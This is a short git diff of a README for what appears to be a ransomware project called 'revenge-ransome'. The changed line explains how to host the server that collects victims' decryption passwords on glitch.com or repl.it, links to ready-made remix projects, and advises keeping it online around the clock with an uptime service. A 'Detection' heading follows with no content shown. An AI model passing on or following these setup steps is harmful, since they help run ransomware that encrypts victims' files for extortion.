@@ -39,7 +39,8 @@ const listener = app.listen(3000, () => {
 });
  
 ```
-- You can use [glitch.com](https://glitch.com) to create projects to get the decrypt password, if you want fresh project [clickhere](https://glitch.com/edit/#!/remix/revenge-ransome), but make sure to make the project 24/7 by using service like uptimerobot.
+- You can use [glitch.com](https://glitch.com) or [repl.it](https://repl.it/) to create projects to get the decrypt password, if you want fresh project [click here for fresh glitch.com project](https://glitch.com/edit/#!/remix/revenge-ransome) [or here for repl.it project](https://repl.it/repls/SuperiorCarefulScreenscraper), but make sure to make the project 24/7 by using service like uptimerobot.
+
 
 
 # Detection
